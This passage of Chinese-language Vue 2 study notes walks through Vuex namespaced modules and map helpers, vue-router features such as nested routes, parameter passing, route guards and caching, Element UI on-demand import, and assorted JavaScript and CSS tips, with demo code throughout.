注意click绑定的方法，要传你的参数给他，比如incrementOdd(n)、incrementWait(n)

methods:{
    //靠mapActions生成：incrementOdd、incrementWait（对象形式）
    ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'}),

    //靠mapActions生成：incrementOdd、incrementWait（数组形式）
    ...mapActions(['jiaOdd','jiaWait']),
    
    //靠mapActions生成：increment、decrement（对象形式）
    ...mapMutations({increment:'JIA',decrement:'JIAN'}),

    //靠mapMutations生成：JIA、JIAN（数组形式）
    ...mapMutations(['JIA','JIAN']),
}
```

### 四个map方法的完整代码

获取store数据的组件代码如下，store的index.js的代码不变！

```vue
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<h3>当前求和的10倍为：{{ bigSum }}</h3>
		<h3>我是{{ name }}，我在{{ school }}学习</h3>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment(n)">+</button>
		<button @click="decrement(n)">-</button>
		<button @click="addOdd(n)">当前求和为奇数再加</button>
		<button @click="addWait(n)">等一等再加</button>
	</div>
</template>

<script>
	import {mapState, mapGetters, mapMutations, mapActions} from 'vuex'	//🔴

	export default {
		name: 'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
  computed: {		
			...mapState(['sum','school','name']),
			...mapGetters(['bigSum'])
		},
		methods: {
			...mapMutations({increment:'ADD', decrement:'SUBTRACT'}),
			...mapActions(['addOdd', 'addWait'])
		},
	}
</script>

<style>
	button{
		margin-left: 5px;
	}
</style>
```





## 10.3 vuex模块化开发

### namespace+modules

模块化后如下图，各个组件独立管理共享的数据

![image-20220611140932278](https://i0.hdslb.com/bfs/album/08ad9c4257d7fcda3bf5be02627042b6eafc0c15.png)

>  没有模块化的数据在：`vc.$store.state.personList`
>
> 而共享数据就在：`vc.$store.state.personAbout.personList`

![image-20220611154326673](https://i0.hdslb.com/bfs/album/cc4cd288bb06a27152394ff81677046a88ca51b0.png)



引入问题：如果很多组件们都要使用vuex的共享数据，那么那个store下的index.js就会很多的代码乱七八糟了，我们可以将每个组件进行模块化管理。

**store下的index.js**

```js
//组件1要用共享数据
const countAbout = {
  namespaced: true,	// 开启命名空间，才能配合map的四个方法找到我
  state: {x:1},
  mutations: { ... },
  actions: { ... },
  getters: {
    bigSum(state){ return state.sum * 10 }
  }
}
//组件2要用共享数据
const personAbout = {
  namespaced: true,	// 开启命名空间，才能配合map的四个方法找到我
  state: { ... },
  mutations: { ... },
  actions: { ... }
}
//store里这样引入就可以了
const store = new Vuex.Store({
  modules: {
    countAbout,
    personAbout
  }
})
```

>**其实真正的模块化**，是把上面的这一个个单独的countAbout、personAbout**拆为一个单独的js文件。**
>
>最后再把单独的他们全部引入到index.js文件里，完成功能跟上面的代码功能一样！



### 模块化后取数据和调用方法

 开启命名空间后，组件中读取state数据 

```js
// 方式一：自己直接读取
this.$store.state.personAbout.list
// 方式二：借助mapState读取：
...mapState('countAbout',['sum','school','subject']),
```

开启命名空间后，组件中读取getters数据

```js
//方式一：自己直接读取
this.$store.getters['personAbout/firstPersonName']
//方式二：借助mapGetters读取：
...mapGetters('countAbout',['bigSum'])
```

开启命名空间后，组件中调用dispatch给服务员Action

```js
//方式一：自己直接dispatch
this.$store.dispatch('personAbout/addPersonWang',person)
//方式二：借助mapActions：
...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
```

开启命名空间后，组件中调用commit

```js
//方式一：自己直接commit
this.$store.commit('personAbout/ADD_PERSON',person)
//方式二：借助mapMutations：
...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
```



### ❤️模块化store代码演示❤️

#### index.js

```js
import Vue from 'vue'
import Vuex from 'vuex'
import countOptions from './count'		// 引入count
import personOptions from './person'	// 引入person

Vue.use(Vuex)
   
//创建并暴露store
export default new Vuex.Store({
    modules:{
        countAbout:countOptions,
        personAbout:personOptions,
    }
})
```

count.js

```js
export default {
    namespaced:true,
    actions: {
        addOdd(context,value){
            console.log("actions中的addOdd被调用了")
            if(context.state.sum % 2){   //当前和为奇数再加，从这能看出context的作用了
                context.commit('ADD',value)
            }
        },
        addWait(context,value){
            console.log("actions中的addWait被调用了")
            setTimeout(()=>{
                context.commit('ADD',value)
            },500)
        }
    },
    mutations: {
        ADD(state,value){ state.sum += value },    //state不就下文的state
        SUBTRACT(state,value){ state.sum -= value }
    },
    state: {
        sum:0,
        school:'尚硅谷',
      	subject: '前端'
    },
    getters: {
        bigSum(state){ return state.sum * 10 }
    }
}
```



#### person.js

```js
import axios from "axios"
import { nanoid } from "nanoid"

export default{
    namespaced:true,
    actions:{
        addPersonWang(context,value){
            if(value.name.indexOf('王') === 0){
                context.commit('ADD_PERSON',value)
            }else{
                alert('添加的人必须姓王！')
            }
        },
        addPersonServer(context){
            axios.get('http://api.uixsj.cn/hitokoto/get?type=social').then(
                response => {
                    context.commit('ADD_PERSON',{id:nanoid(),name:response.data})
                },
                error => { alert(error.message) }
            )
        }
    },
    mutations:{
        ADD_PERSON(state,value){
            console.log('mutations中的ADD_PERSON被调用了')
            state.personList.unshift(value)
        }
    },
    state:{
        personList:[]
    },
    getters:{
        firstPersonName(state){ return state.personList[0].name }
    }
}
```

#### Count.vue

```vue
<template>
	<div>
		<h1>当前求和为：{{ sum }}</h1>
		<h3>当前求和的10倍为：{{ bigSum }}</h3>
		<h3>我是{{ name }}，我在{{ school }}学习</h3>
		<h3 style="color:red">Person组件的总人数是：{{ personList.length }}</h3>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment(n)">+</button>
		<button @click="decrement(n)">-</button>
		<button @click="incrementOdd(n)">当前求和为奇数再加</button>
		<button @click="incrementWait(n)">等一等再加</button>
	</div>
</template>

<script>
	import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'

	export default {
		name:'Count',
		data() {
			return {
				n:1, // 用户选择的数字
			}
		},
    computed:{
			...mapState('countAbout',['sum','school','name']),
      ...mapState('personAbout',['personList']),
			...mapGetters('countAbout',['bigSum']),
		}
		methods: {
			...mapMutations('countAbout',{increment:'ADD',decrement:'SUBTRACT'}),
			...mapActions('countAbout',{incrementOdd:'addOdd',incrementWait:'addWait'})
		},
	}
</script>

<style>button{margin-left: 5px;}</style>
```

#### Person.vue

```vue
<template>
	<div>
		<h1>人员列表</h1>
		<h3 style="color:red">Count组件求和为：{{ sum }}</h3>
        <h3>列表中第一个人的名字是：{{ firstPersonName }}</h3>
		<input type="text" placeholder="请输入名字" v-model="name">
		<button @click="add">添加</button>
        <button @click="addWang">添加一个姓王的人</button>
        <button @click="addPerson">随机添加一个人</button>
		<ul>
			<li v-for="p in personList" :key="p.id">{{ p.name }}</li>
		</ul>
	</div>
</template>

<script>
	import {nanoid} from 'nanoid'
	export default {
		name: 'Person',
		data() {
			return {
				name:''
			}
		},
		computed: {
			personList(){
				return this.$store.state.personAbout.personList
			},
			sum(){
				return this.$store.state.countAbout.sum
			},
      firstPersonName(){
        return this.$store.getters['personAbout/firstPersonName']
      }
		},
		methods: {
			add(){
             //nanoid：随机生成的id
				const personObj = {id:nanoid(),name:this.name}
				this.$store.commit('personAbout/ADD_PERSON',personObj)
				this.name = ''
			},
      addWang(){
        const personObj = {id:nanoid(),name:this.name}
        this.$store.dispatch('personAbout/addPersonWang',personObj)
        this.name = ''   
      },
      addPerson(){
        this.$store.dispatch('personAbout/addPersonServer')
      }
		},
	}
</script>
```



# 十一、路由vue-router

## 11.1 初步使用路由

### 1、小案例

> `<router-link to="路由路径">点我路由跳转</router-link>`标签
>
>`<router-link class="list-group-item" active-class="active" to="/about">About</router-link>`
>
>active-class="active"   **路由动态高亮**
>
>一级路径要加斜杆：path:'/about'，二级路由不用斜杆

#### src/router/index.js

```js
import VueRouter from 'vue-router'
// 引入组件
import About from '../components/About'
import Home from '../components/Home'

// 创建并暴露一个路由器
export default new VueRouter({
	routes:[            //routes数组
		{
            //路由路径
			path:'/about',
            //要路由的组件
			component:About
		},
		{
			path:'/home',
			component:Home
		}
	]
})
```

#### main.js

```js
import Vue from 'vue'
import App from './App.vue'
import VueRouter from 'vue-router'	// 引入VueRouter
import router from './router'				// 引入路由器

Vue.config.productionTip = false

Vue.use(VueRouter)	// 应用插件

new Vue({
	el:'#app',
	render: h => h(App),
	router:router
})
```

#### App.vue

> **Bootstrap**网格布局，一共有12列
>
> - col-xs-offset-2：在左侧偏移2列
> - class="row"  独占一行，row下面有子div就一起划分这一行，即子div们都在同一行！
>
> - class="col-xs-6"：元素共占6列

```vue
<template>
  <div>
    <div class="row">
      <div class="col-xs-offset-2 col-xs-8">
        <div class="page-header"><h2>Vue Router Demo</h2></div>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
					<!-- 原始html中我们使用a标签实现页面的跳转 -->
          <!-- <a class="list-group-item active" href="./about.html">About</a> -->
          <!-- <a class="list-group-item" href="./home.html">Home</a> -->

           <!-- Vue中借助router-link标签实现路由的切换 -->
           <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
       </div>
       <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
			<!-- 指定组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
       </div>
    </div><!-- row -->
  </div>
</template>

<script>
	export default {
		name:'App'
	}
</script>
```

切换的页面，最后放在App里的router视图中展示。

Home.Vue

```vue
<template>
	<h2>我是Home的内容</h2>
</template>

<script>
	export default {
		name:'Home'
	}
</script>
```

**结果如下**：

---

<img src="https://img-blog.csdnimg.cn/20210528200034331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwNzg5MjAx,size_16,color_FFFFFF,t_70" alt="img" style="zoom:67%;" />

---





### 2、路由进一步了解

1. 我们要引入到App.vue的组件为一般组件，**一般组件**写在components组件目录下，**路由组件写在pages目录下**。
2. 路由的组件，当不展示那个组件时候，那个**路由的组件vc会被销毁**
3. 每个路由组件都有**自己独有的$route**，但是他们**同属一个router**，router用$router属性拿到

### 3、多级嵌套路由

二级路由路由路径不用加斜杠

router-link的to="路径"，路径要写全，带着父路径

>`<router-link class="list-group-item" active-class="active" to="/home/news">About</router-link>`

src/router/index.js的关键代码

```js
routes:[
	{
		path:'/about',
		component:About,
	},
	{
		path:'/home',
		component:Home,
		children:[ 					// 通过children数组配置子级路由
			{
				path:'news', 		// 二级路由不要带斜杠
				component:News
			},
			{
				path:'message',	// 二级路由不要带斜杠
				component:Message
			}
		]
	}
]
```

## 11.2 路由如何传参

### 跳转并query传参

点击router-link路由跳转时，用query进行传参。

> 参数相关route、跳转相关router

News.vue 传递参数 给  Detail.vue

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带query参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">
                      {{m.title}}
    				 </router-link>&nbsp;&nbsp; -->

        <!-- 跳转路由并携带query参数，to的对象写法 -->
        <router-link :to="{
                            path:'/home/message/detail',
                            query:{
                              id:m.id,
                              title:m.title
                            }
                          }">
          {{m.title}}
      </router-link>&nbsp;&nbsp;
      </li>
    </ul>
    <hr/>
    <router-view></router-view>
  </div>
</template>

<script>
  export default {
    name:'News',
    data(){
      return{
        messageList:[
          {id:'001',title:'消息001'},
          {id:'002',title:'消息002'},
          {id:'003',title:'消息003'}
        ]
      }
    }
  }
</script>
```

> 接收参数用**route**
>
> - $route.query.id 
> - $route.query.title

Detail.vue接收参数

```vue
<template>
    <ul>
        <li>消息编号：{{ $route.query.id }}</li>
        <li>消息标题：{{ $route.query.title }}</li>
    </ul>
</template>

<script>
    export default {
        name:'Detail'
    }
</script>
```



### 给路由起别名name

> 作用：跳转的路由名字过长时，用路由名字来跳转，就不用写那么长的路由路径了。

```js
{
	path:'/demo',
	component:Demo,
	children:[
		{
			path:'test',
			component:Test,
			children:[
				{
                 name:'hello' // 给路由命名
					path:'welcome',
					component:Hello,
				}
			]
		}
	]
}
```

简化跳转：**to用对象写法，用v-bind识别js表达式**

```vue
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后+无参数，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化后+传递参数 -->
<router-link 
	:to="{
		name:'hello',
		query:{
		  id:666,
        title:'你好'
		}
	}"
>跳转</router-link>
```





### params传参

> 注意：
>
> - 使用params时候，跳转的路由不能写路径名，必须写路由的名字name
> - path路径必须有参数的占位符

配置路由，声明接收params参数

```js
{
	path:'/home',
	component:Home,
	children:[
		{
			path:'news',
			component:News
		},
		{
			component:Message,
			children:[
				{
					name:'xiangqing',
					path:'detail/:id/:title', // 🔴使用占位符声明接收params参数
					component:Detail
				}
			]
		}
	]
}
```

传参数：跳转的路由必须写name喔

```vue
<!-- 跳转并携带params参数，to的字符串写法 -->
<router-link :to="/home/message/detail/666/你好">跳转</router-link>
				
<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
	:to="{
		name:'xiangqing',
		params:{
		    id:666,
       		title:'你好'
		}
	}"
>跳转</router-link>
```

接收参数

```vue
<template>
  <ul>
    <li>消息编号：{{ $route.params.id }}</li>
    <li>消息标题：{{ $route.params.title }}</li>
  </ul>
</template>

<script>
    export default {
        name:'Detail'
    }
</script>
```



### props配置+params

> 作用：简写接收参数的组件，接收参数的那个组件，总是要写：$route.params.id、 $route.params.title

在路由的index.js中，我喜欢第二种写法，props配置+params（因此路径要参数的占位坑）

在路由配置中：

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，为true时，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props($route){
		return {
			id: $route.query.id,
			title: $route.query.title
		}
	}
}
```

**此时接收参数，要用props接收**，变得很简洁{{ id }}

```vue
<template>
    <ul>
        <li>消息编号：{{ id }}</li>
        <li>消息标题：{{ title }}</li>
    </ul>
</template>

<script>
    export default {
        name:'Detail',
        //props接收
        props:['id','title']
    }
</script>
```



## 11.3 路由属性

### router-link的push和replace

路由的默认属性是push，点击路由跳转时，浏览器可以后退浏览的历史记录

![image-20220612022959922](https://i0.hdslb.com/bfs/album/2c9860ca38eee2e5fddd5b4e2c774d4307437b26.png)

代码：news和message的路由跳转，添加了replace属性

```vue
<template>
  <div>
    <h2>Home组件内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link replace class="list-group-item" active-class="active" 
                       to="/home/news">News</router-link>
    		</li>
        <li>
          <router-link replace class="list-group-item" active-class="active" 
                       to="/home/message">Message</router-link>
    		</li>
    </ul>
    <router-view></router-view>
    </div>
  </div>
</template>

<script>
  export default {
    name:'Home'
  }
</script>
```



### 编程式路由导航

> 作用：实现点击**按钮或其他任意元素**也可**实现路由跳转**。因为上面的所有路由跳转，都是在router-link下的，他们本质都是a标签跳转
>
> 写法跟router-link差不多，注意param在index.js的占位坑和name限制！

**API总结：**跳转是调用**router，而router在vc身上**

- this.$router.push({})	内传的对象与`<router-link>`中的to相同
- this.$router.replace({})	
- this.$router.forward()	前进
- this.$router.back()		后退
- this.$router.go(n)		可前进也可后退，n为正数前进n，为负数后退



```vue
<template>
    <div>
        <ul>
            <li v-for="m in messageList" :key="m.id">
                <router-link :to="{
                    name:'xiangqing',
                    params:{
                        id:m.id,
                        title:m.title
                    }
                }">
                    {{m.title}}
                </router-link>
                <button @click="showPush(m)">push查看</button>
                <button @click="showReplace(m)">replace查看</button>
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
    export default {
        name:'News',
        data(){
            return{
                messageList:[
                    {id:'001',title:'消息001'},
                    {id:'002',title:'消息002'},
                    {id:'003',title:'消息003'}
                ]
            }
        },
        methods:{
            showPush(m){
                //push跳转
                this.$router.push({
                    name:'xiangqing',
                    query:{
                        id:m.id,
                        title:m.title
                    }
                })
            },
            showReplace(m){
                //replace跳转
                this.$router.replace({
                    name:'xiangqing',
                    query:{
                        id:m.id,
                        title:m.title
                    }
                })
            }
        }
    }
</script>
```



### 路由缓存

> 作用：路由跳转时，让原路由的**组件vc不被销毁**，那么用户在那组件输入框输入的数据就会缓存保留着。

```vue
// 缓存一个路由组件
<keep-alive include="News"> // include中写想要缓存的组件名，若不写，则表示全部使用 <router-view/>展示的组件都会被缓存
    <router-view></router-view>
</keep-alive>

// 缓存多个路由组件
<keep-alive :include="['News','Message']"> 
    <router-view></router-view>
</keep-alive>
```



### 两个新的生命周期钩子

> 这两个生命周期是路由组件独有的
>
> - activated：激活状态就是你正在浏览这个路由组件，作用：如用于启动定时器
>
> - deactivated：失活状态，就是你不浏览这个路由组件了，**并且这个组件vc是没有被销毁的，是开启了缓存的**。
>
>   ​                       作用： 缓存+失活，用于清除定时器+缓存路由组件页面！

![](https://i0.hdslb.com/bfs/album/93d72fda02075e3f56762e11a588a42402ede049.gif)

```vue
<template>
    <ul>
        <li :style="{opacity}">欢迎学习vue</li>
        <li>news001 <input type="text"></li>
        <li>news002 <input type="text"></li>
        <li>news003 <input type="text"></li>
    </ul>
</template>

<script>
    export default {
        name:'News',
        data(){
            return{
                opacity:1
            }
        },
        activated(){
            console.log('News组件被激活了')
            this.timer = setInterval(() => {
                this.opacity -= 0.01
                if(this.opacity <= 0) this.opacity = 1
            },16)
        },
        deactivated(){
            console.log('News组件失活了')
            clearInterval(this.timer)
        }
    }
</script>
```



## 11.4路由守卫

### 1. 全局路由守卫

全局路由守卫 = 全局**前置**路由守卫 + 全局路由**后置**守卫

> 前置守卫作用：添加了**访客每一次跳转路由之前**的权限，**全局就是所有的路由**在切换的时候都要走守卫函数！
>
> 后置守卫作用：就是路由组件进入了，你进入了这个页面执行的操作，比如拿来更改浏览器标题。

`router.beforeEach((to,from,next)=>{})`

- to：你要看哪个路由组件？

- from：你来自哪个路由组件？

- next：放行，给你查看！       还可以这样：`next('/login')`，没有权限，跳回到登录页

- meta:{}    路由元数据，程序员可以在这自定义自己的数据。*路由是配置对象，配置对象内的定义有要求，不能随便自定义数据，所以他给你提供了meta。*

  ​                 老师在这存放了浏览器标题、



代码：全局路由是写在src/router/index.js中

```js
// 全局前置守卫：初始化时、每次路由切换前执行
router.beforeEach((to,from,next) => {
	console.log('beforeEach',to,from)
  //if(to.name === 'xinwen' || to.name === 'xiaoxi'  )
	if(to.meta.isAuth){ // 判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'atguigu'){ // 权限控制的具体规则
			next()	// 放行
		}else{
			alert('暂无权限查看')
		}
	}else{
		next()	// 放行
	}
})

// 全局后置守卫：初始化时、每次路由切换后执行，没有next，都放行了还要什么next
//meta里加了title标题,document.title改浏览器标题，js的知识。
router.afterEach((to,from) => {
	console.log('afterEach',to,from)
	if(to.meta.title){ 
		document.title = to.meta.title //路由切换进入了，才修改网页的title
	}else{
		document.title = 'vue_test'
	}
})
```



### 2. 路由独享守卫

在要独享的路由里边添加，独享路由守卫没有后置守卫，这是前置的

```js
beforeEnter(to,from,next){
	console.log('beforeEnter',to,from)
    if(localStorage.getItem('school') === 'atguigu'){
        next()
    }else{
        alert('暂无权限查看')
    }
}
```

### 3. 组件内路由守卫

写在组件vc里的路由守卫，跟methods、mouted等同级。

> 组件内路由守卫，两个不定时一对连着写的，因为离开要放行！

- 进入组件前的守卫：跟前置守卫一样
- 离开组件后的守卫：跟后置守卫不同，要区分。**而且他要放行**，不然离开是能离开，但是跳转不了啊。

代码：

```vue
<template>
    <h2>我是About组件的内容</h2>
</template>

<script>
    export default {
        name:'About',
        // 通过路由规则，进入前该组件时被调用
        beforeRouteEnter (to, from, next) {
            if(localStorage.getItem('school')==='atguigu'){
                next()
            }else{
                alert('学校名不对，无权限查看！')
            }
        },
        // 通过路由规则，离开该组件时被调用
        beforeRouteLeave (to, from, next) {
            console.log('About--beforeRouteLeave',to,from)
            next()
        }
    }
</script>
```



## 11.5 history和hash工作模式

> 对于一个url来说，什么是hash值？

#及其后面的内容就是hash值。hash值不会包含在HTTP请求中，即：hash值不会带给服务器 

> hash模式 

- 地址中永远带着#号，不美观
- 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法
- 兼容性较好

> history模式

- 地址干净，美观
- 兼容性和hash模式相比略差
- 应用部署上线时，**需要后端人员解决**刷新页面服务端404的问题



# 十二、UI组件库

## 12.1常用UI组件库集合

### 1. 移动端

1[Vant](https://youzan.github.io/vant)
2[Cube UI](https://didi.github.io/cube-ui)
3[Mint UI](http://mint-ui.github.io/)
4https://nutui.jd.com/#/    京东的移动端UI

### 2. PC端

1. [Element UI](https://element.eleme.cn/)
2. [IView UI](https://www.iviewui.com/)
3. Ant UI for VUE，饿了么是基于Ant的基础上开发的





## 12.2 饿了么按需引入

### 1. 安装 babel-plugin-component

`npm i babel-plugin-component -D` 

### 2. 修改 babel.config.js

`@babel/preset-env`这个写法，es5最新的一些问题

在这个文件，他的样式他会自动分析你要用的样式的；我们要关注的就是我们要用饿了么的哪个组件就行。

```js
module.exports = {
  presets: [
    '@vue/cli-plugin-babel/preset',
    ["@babel/preset-env", { "modules": false }]
  ],
  plugins: [
    [
      "component",
      {        
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}
```

### 3. 修改main.js

```js
import Vue from 'vue'
import App from './App.vue'
import { Button,Row } from 'element-ui'	// 按需引入

Vue.config.productionTip = false

Vue.component(Button.name, Button);
Vue.component(Row.name, Row);
/* 或写为
 * Vue.use(Button)
 * Vue.use(Row)
 */

new Vue({
    el:"#app",
    render: h => h(App),
})
```

全部引入

import Element from 'element-ui'





# END



## 1、简写合集

data:function(){  }	简写且后面实际问题多得写成	data(){}

`v-bind:`	简写   `:`

v-model:value=	简写就是v-model=

get:function cola(){}	get(){}

`showInfo2(event){}`			简写是showInfo2(e)。

v-on:click 			简写是@click。`v-on:`的简写就是`@`，绑定事件！

fullName:{}   在只有get时候简写fullName(){}



## 2、Vue风格指南

![image-20220605212951612](https://i0.hdslb.com/bfs/album/9676e81b4681a5844e648da715159743db58a393.png)







## 3、Vue debugger调试

在要断点的地方添加`debugger`即可

## 4、css遗忘知识

### 鼠标在某个元素上悬浮

![image-20220608143709537](https://i0.hdslb.com/bfs/album/a975b5b58c920ddfcff58f56d9c8217aa688801d.png)

```css
/* 鼠标悬浮有背景色 */
li:hover{
background:#ddd;
}

/* 正常状态是隐藏的 */
li button {float: right;display: none;margin-top: 3px;}
/* 鼠标悬浮式显示 */
li:hover button{display: block;}
```

![image-20220608144128310](https://i0.hdslb.com/bfs/album/99a5c7221444e99f276aa9a6d26f05ca500fd518.png)

## 5、JavaScript的方法

### 1、数组的几大方法

文章：[ js数组常用方法](https://blog.csdn.net/qq_39132756/article/details/85007082?ops_request_misc=%7B%22request%5Fid%22%3A%22165374109316781683916140%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=165374109316781683916140&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-85007082-null-null.142^v11^pc_search_result_control_group,157^v12^control&utm_term=js数组方法&spm=1018.2226.3001.4187)；



[(69条消息) JS 删除数组中某个元素的几种方式_百里狂生的博客-CSDN博客_js 数组删除某个元素](https://blog.csdn.net/Li_dengke/article/details/105249837?ops_request_misc=&request_id=&biz_id=102&utm_term=js数组删除指定元素&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-105249837.nonecase&spm=1018.2226.3001.4187)；







### 2、用户交互弹窗确定

```js
if(confirm('确定删除吗？')){}


// 删除
      handleDelete(id){
        if(confirm('确定删除吗？')){
          this.deleteTodo(id) // 通知App组件将对应的todo对象删除
        }
```



### 3、WebStorage浏览器本地存储:heart:

> 浏览器端通过`Window.sessionStorage`和`Window.localStorage`属性来实现本地存储机制 
>
> **存的都是key-value，而且都是字符串类型，json类型的对象存储到value，要转成string类型！**读取的时候又要转成Json对象型。

1. **SessionStorage**		会话存储，浏览器窗口关闭则消失

2. **LocalStorage**          本地存储，需要手动清除才会消失

   xxxStorage.getItem(xxx)        如果 key 对应的 value 获取不到，那么getItem()的**返回值是null**；

   存储内容大小一般支持 5MB 左右（不同浏览器可能还不一样）

> 相关API

| api                                | 含义                                               |
| ---------------------------------- | -------------------------------------------------- |
| xxxStorage.setItem('key', 'value') | 存储一个键值对，都是String类型，键值如果存在会覆盖 |
| xxxStorage.getItem('key')          | 通过key找到value值，返回到控制台                   |
| xxxStorage.removeItem('key')       | 通过key值删除键值对                                |
| xxxStorage.clear()                 | 情况浏览器所有的本地存储                           |



代码

```html

<h2>localStorage</h2>
<button onclick="saveDate()">点我保存数据</button><br/>
<button onclick="readDate()">点我读数据</button><br/>
<button onclick="deleteDate()">点我删除数据</button><br/>
<button onclick="deleteAllDate()">点我清空数据</button><br/>

<script>
  let person = {name:"JOJO",age:20}

  //增
  function saveDate(){
    localStorage.setItem('msg','localStorage')
    localStorage.setItem('person',JSON.stringify(person))
  }
  //查
  function readDate(){
    console.log(localStorage.getItem('msg'))
    const person = localStorage.getItem('person')
    console.log(JSON.parse(person))
  }
  //删
  function deleteDate(){
    localStorage.removeItem('msg')
    localStorage.removeItem('person')
  }
  //清空所有
  function deleteAllDate(){
    localStorage.clear()
  }
</script>
```





### 4、失去焦点事件blur

就是跟click、keyup那些同级



### 5、判断一个对象是否有某个属性

对象.hasOwnProperty('属性')



### 6、给输入框自动获取焦点focus

ref属性，拿到输入框的DOM元素.focus即可



### 7、定时器

![image-20220609230100424](https://i0.hdslb.com/bfs/album/62710f16ff2861f1686bb4019a28db1d46279004.png)
